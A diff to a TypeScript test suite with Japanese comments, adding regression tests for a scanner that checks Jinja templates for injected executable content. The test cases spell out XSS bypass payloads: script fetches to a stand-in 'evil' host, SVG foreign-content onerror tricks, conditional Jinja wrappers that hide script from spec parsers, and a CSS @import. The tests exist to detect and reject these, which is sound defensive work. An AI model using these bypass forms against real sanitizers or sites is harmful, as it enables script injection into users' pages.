@@ -278,7 +278,7 @@ describe('Jinja トークンを前置した URL', () => {
   });
 });
 
-// ── 走査器の終端規則(F3 / F21)──
+// ── 走査器の終端規則 ──
 // この走査器は手書きで、仕様準拠パーサではない。よって「終端の解釈がブラウザとずれる」
 // 形が迂回路になる。ずれている間、単位列は基準と一致したまま実行面だけが増える。
 describe('コメント終端 --!> の解釈', () => {
@@ -310,6 +310,69 @@ describe('コメント終端 --!> の解釈', () => {
   });
 });
 
+// ── タグ内 Jinja の読み飛ばし(仕様準拠パーサ化の評価で出た実測の迂回路)──
+// 走査器は「タグ内に Jinja 断片があれば読み飛ばす」が、読み飛ばせないと判断したときに
+// **入力の残り全部を捨てて**いた。単位列は基準と完全一致したまま、その後ろに任意の
+// 実行面を足せる = 不変性ゲートそのものの迂回路である(申請・承認の両入口を通った)。
+// ブラウザは `{` を普通の属性名文字として読み、タグを最初の `>` で閉じて後続を実行する。
+describe('タグ内 Jinja で走査を打ち切らない', () => {
+  const inject = (prefix: string): string =>
+    `<html><body><script>col.width=1</script>${prefix}<script>fetch("//evil/")</script></body></html>`;
+
+  it.each([
+    ['Jinja 開始ですらない `{`', '<div {>'],
+    ['閉じない {{', '<div {{ x >'],
+    ['閉じない {%', '<p {% for >'],
+    ['閉じない {#', '<span {#>'],
+  ])('%s を挟んで足した script を拒否する', (_label, prefix) => {
+    const evil = inject(prefix);
+    expect(collectExecutableUnits(evil)).toContain('script:|fetch("//evil/")');
+    expect(accepted(BASE, evil)).toBe(false);
+  });
+
+  it('遠くの閉じ記号で script を丸ごと 1 断片に飲み込む形も拒否する', () => {
+    // `}}` を文書の後ろへ置けば、その間の実行面が「タグ内 Jinja」として単位から消えていた。
+    const evil = '<div {{ ><script>fetch("//evil/")</script>}}></div>';
+    expect(collectExecutableUnits(evil)).toContain('script:|fetch("//evil/")');
+    expect(accepted('<div></div>', evil)).toBe(false);
+  });
+
+  it('正当なタグ内 Jinja は 1 単位のまま(`>` を含む式でも分割しない)', () => {
+    expect(collectExecutableUnits('<td {% if a > b %}class="x"{% endif %}>a</td>')).toEqual([
+      'jinja-attr:td|{% if a > b %}',
+      'jinja-attr:td|{% endif %}',
+    ]);
+    expect(collectExecutableUnits('<div {{ d["k"] }}>x</div>')).toEqual([
+      'jinja-attr:div|{{ d["k"] }}',
+    ]);
+  });
+});
+
+// ── 仕様準拠パーサ(parse5 等)へ置き換えないことの根拠(回帰ガード)──
+// 検査対象は**描画前の Jinja テンプレ**であって HTML 文書ではない。ゆえに HTML 仕様どおりの
+// 木構築は「別の成果物に対する正しさ」になる: 生の字面では raw text 要素やコメントに
+// 包まれて見えるものが、Jinja 描画後には包みが消えて実行される。実測で parse5 は下の 3 形を
+// すべて単位ゼロにした(= 素通り)のに対し、本走査器の過剰包含は拾う。ここが緑である限り
+// 「木構築するパーサへ置き換える」は退行である。
+describe('描画前テンプレ特有の隠し方(木構築パーサでは消える形)', () => {
+  const inject = (prefix: string, suffix: string): string =>
+    `<html><body><script>col.width=1</script>${prefix}<script>fetch("//evil/")</script>${suffix}</body></html>`;
+
+  it.each([
+    [
+      '条件付き textarea',
+      '{% if false %}<textarea>{% endif %}',
+      '{% if false %}</textarea>{% endif %}',
+    ],
+    ['条件付きコメント', '{% if false %}<!--{% endif %}', '{% if false %}-->{% endif %}'],
+    ['条件付き title', '{% if false %}<title>{% endif %}', '{% if false %}</title>{% endif %}'],
+  ])('%s で包んでも実行面として拾う', (_label, prefix, suffix) => {
+    const evil = inject(prefix, suffix);
+    expect(collectExecutableUnits(evil)).toContain('script:|fetch("//evil/")');
+    expect(accepted(BASE, evil)).toBe(false);
+  });
+});
+
 describe('raw text の終了タグは直後の文字まで見る', () => {
   it('</scriptx> は終了タグではない(末尾のコードが単位へ入る)', () => {
     // JS エンジンは `init() < /scriptx>/ ; evil()` と読むので `evil()` が走る。
@@ -329,5 +392,41 @@ describe('raw text の終了タグは直後の文字まで見る', () => {
     const base = '<html><body><script>col.width=1</script></body></html>';
     const same = '<html><body><script>col.width=1</SCRIPT ></body></html>';
     expect(accepted(base, same)).toBe(true);
+  });
+});
+
+// ── 走査器とブラウザの解釈がずれる形 ──
+// 「読み飛ばした範囲は必ず単位化する」という不変則を、raw text 要素ごとに機械検証する。
+// SVG の foreign content では raw text にならない、という事実は raw text 扱いする全要素へ
+// 一様に効く。要素を足して単位化の分岐を書き忘れたらここが落ちる。
+describe('raw text 要素の内側は必ず単位化される', () => {
+  // 実 Chromium で onerror の発火を確認済みの形だけを並べる(単なる字面ではない)。
+  const 実行される形 = {
+    '<style=x> はタグ名が = で終端せず未知要素になる':
+      '<style=x><img src=x onerror="evil()"></style=x>',
+    '<svg><style> は foreign content で raw text にならない':
+      '<svg><style><img src=x onerror="evil()"></style></svg>',
+    '<svg><title> も同様': '<svg><title><img src=x onerror="evil()"></title></svg>',
+    '<svg><textarea> も同様': '<svg><textarea><img src=x onerror="evil()"></textarea></svg>',
+  };
+  const base = '<html><body><h1>基準</h1></body></html>';
+  for (const [label, payload] of Object.entries(実行される形)) {
+    it(`${label} → 単位が増えるので拒否される`, () => {
+      const evil = base.replace('</body>', `${payload}</body>`);
+      expect(collectExecutableUnits(evil)).not.toEqual(collectExecutableUnits(base));
+      expect(accepted(base, evil)).toBe(false);
+    });
+  }
+
+  it('style の CSS 外部参照の単位化は従来どおり残っている(再走査で置き換えていない)', () => {
+    const b = '<div><style>.a{color:red}</style></div>';
+    const evil = '<div><style>@import url(http://evil/x);.a{color:red}</style></div>';
+    expect(accepted(b, evil)).toBe(false);
+  });
+
+  it('CSS の宣言だけの編集は従来どおり通る(過剰包含が正当な操作を止めない)', () => {
+    const b = '<div><style>.a{color:red;width:10px}</style></div>';
+    const edited = '<div><style>.a{color:blue;width:20px}</style></div>';
+    expect(accepted(b, edited)).toBe(true);
   });
 });
